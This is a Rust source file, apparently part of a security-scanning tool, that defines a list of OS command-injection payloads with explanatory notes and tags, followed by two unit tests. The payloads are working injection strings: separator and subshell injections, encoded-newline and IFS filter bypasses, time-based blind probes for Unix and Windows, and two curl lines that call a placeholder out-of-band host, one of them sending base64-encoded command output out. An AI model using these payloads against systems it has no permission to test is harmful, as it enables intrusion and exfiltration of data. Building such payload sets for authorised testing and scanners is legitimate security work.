//! OS command-injection seed payloads.

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::Cmdi;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "; id",
        notes: "semicolon separator — works in sh / bash contexts",
        tags: &["nix", "separator"],
    },
    Payload {
        category: C,
        value: "&& id",
        notes: "logical-AND separator — runs if the prior command succeeds",
        tags: &["nix", "separator"],
    },
    Payload {
        category: C,
        value: "| id",
        notes: "pipe separator — works even when stdout of `id` is the target",
        tags: &["nix", "separator"],
    },
    Payload {
        category: C,
        value: "`id`",
        notes: "backtick subshell — interpolated by sh-likes",
        tags: &["nix", "subshell"],
    },
    Payload {
        category: C,
        value: "$(id)",
        notes: "POSIX subshell — preferred over backticks",
        tags: &["nix", "subshell"],
    },
    Payload {
        category: C,
        value: "%0Aid",
        notes: "URL-encoded newline — bypasses single-line filters",
        tags: &["nix", "encoding"],
    },
    Payload {
        category: C,
        value: "; sleep 5",
        notes: "time-based blind probe — 5s delay confirms execution",
        tags: &["nix", "time-based", "blind"],
    },
    Payload {
        category: C,
        value: "& ping -n 5 127.0.0.1",
        notes: "Windows time-based — 5 ICMPs ~= 4s delay",
        tags: &["windows", "time-based", "blind"],
    },
    Payload {
        category: C,
        value: "& dir",
        notes: "Windows dir — minimal probe",
        tags: &["windows", "separator"],
    },
    Payload {
        category: C,
        value: "; curl http://OAST.SITE/$(id|base64)",
        notes: "OAST exfil — base64 of `id` lands in your collaborator log",
        tags: &["nix", "oast", "exfil"],
    },
    Payload {
        category: C,
        value: ";{IFS}id",
        notes: "IFS-only-separator — bypass for filters that drop literal spaces",
        tags: &["nix", "filter-bypass"],
    },
    Payload {
        category: C,
        value: ";$IFS$9id",
        notes: "IFS-with-positional-arg space substitute",
        tags: &["nix", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "$(curl -s http://OAST.SITE)",
        notes: "OAST blind callback — confirms RCE without needing stdout reflection",
        tags: &["nix", "oast", "blind"],
    },
    Payload {
        category: C,
        value: "|| id",
        notes: "logical-OR separator — runs if prior command failed",
        tags: &["nix", "separator"],
    },
    Payload {
        category: C,
        value: "%0Did",
        notes: "URL-encoded carriage return — alternate to %0A",
        tags: &["nix", "encoding"],
    },
    Payload {
        category: C,
        value: "\nid\n",
        notes: "raw newline injection — works in some JSON-context handlers",
        tags: &["nix", "json-context"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_is_cmdi_class() {
        for p in PAYLOADS {
            assert_eq!(p.category, PayloadCategory::Cmdi);
            assert!(!p.value.is_empty());
        }
    }

    #[test]
    fn has_time_based_payloads_for_both_platforms() {
        let nix_tb = PAYLOADS
            .iter()
            .any(|p| p.tags.contains(&"nix") && p.tags.contains(&"time-based"));
        let win_tb = PAYLOADS
            .iter()
            .any(|p| p.tags.contains(&"windows") && p.tags.contains(&"time-based"));
        assert!(nix_tb);
        assert!(win_tb);
    }
}
